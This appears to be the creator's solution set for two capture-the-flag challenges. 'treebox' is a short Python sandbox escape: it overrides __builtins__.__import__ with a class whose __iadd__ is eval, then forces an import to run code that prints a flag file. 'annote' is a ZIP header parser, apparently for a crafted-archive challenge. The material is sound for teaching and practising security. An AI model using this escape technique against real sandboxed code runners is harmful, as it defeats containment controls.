## Creator solution
### treebox
```python
#!/usr/bin/python3
class X():
  def __init__(self, a, b, c, d, e):
    self += "print(open('flag').read())"
  __iadd__ = eval
__builtins__.__import__ = X
{}[1337]
```
### annote
```python
import sys
from struct import pack, unpack


data = open(sys.argv[1], "rb").read()

for i in range(len(data) - 3):
  sig = unpack("<I", data[i:i+4])[0]
  if sig == 0x04034b50:
    print("%04x: LFH" % i)
    fnamelen = unpack("<H", data[i+26:i+28])[0]
    extralen = unpack("<H", data[i+28:i+30])[0]
    fname = data[i+30:i+30+fnamelen]
    comprlen = unpack("<I", data[i+18:i+22])[0]
    compr = data[i+30+extralen+fnamelen:i+30+extralen+fnamelen+comprlen]
    print("  name: %s" % fname.decode())
    print("  data: %s" % compr)
  elif sig == 0x02014b50:
    print("%04x: CDFH" % i)
    fnamelen = unpack("<H", data[i+28:i+30])[0]
    rel_off = unpack("<I", data[i+42:i+46])[0]
    fname = data[i+46:i+46+fnamelen]
    print("  name: %s" % fname)
    print("  rel_off: 0x%x" % rel_off)
  elif sig == 0x06054b50:
    print("%04x: EOCD" % i)
    sig, this, disk, num_cd, tot_cd, sz_cd, off_cd, comlen = unpack("<IHHHHIIH", data[i:i+22])
    com = data[i+22:i+22+comlen]
    print("  this, disk: %d, %d" % (this, disk))
    print("  num_cd, tot_cd: %d, %d" % (num_cd, tot_cd))
    print("  cd_sz: %d" % sz_cd)
    print("  cd_off: 0x%x" % off_cd)
    print("  comment: %s" % ("(%d bytes)" % comlen))

print("---")
print("Trying to parse.")

for i in range(len(data) - 3):
  sig = unpack("<I", data[i:i+4])[0]
  if sig == 0x06054b50:
    print("%04x: EOCD" % i)
    sig, this, disk, num_cd, tot_cd, sz_cd, off_cd, comlen = unpack("<IHHHHIIH", data[i:i+22])
    assert comlen == len(data) - i - 22
    assert tot_cd == 1
    assert num_cd == 1
    com = data[i+22:i+22+comlen]
    i = off_cd
    sig = unpack("<I", data[i:i+4])[0]
    if sig == 0x02014b50:
      print("  %04x: CDFH" % i)
      fnamelen = unpack("<H", data[i+28:i+30])[0]
      rel_off = unpack("<I", data[i+42:i+46])[0]
      fname = data[i+46:i+46+fnamelen]
      i = rel_off
      sig = unpack("<I", data[i:i+4])[0]
      if sig == 0x04034b50:
        print("    %04x: LFH" % i)
        fnamelen = unpack("<H", data[i+26:i+28])[0]
        extralen = unpack("<H", data[i+28:i+30])[0]
        fname2 = data[i+30:i+30+fnamelen]
        assert fname == fname2
        comprlen = unpack("<I", data[i+18:i+22])[0]
        compr = data[i+30+extralen+fnamelen:i+30+extralen+fnamelen+comprlen]
        print("      name & data: %s & %s" % (fname.decode(), compr))
```
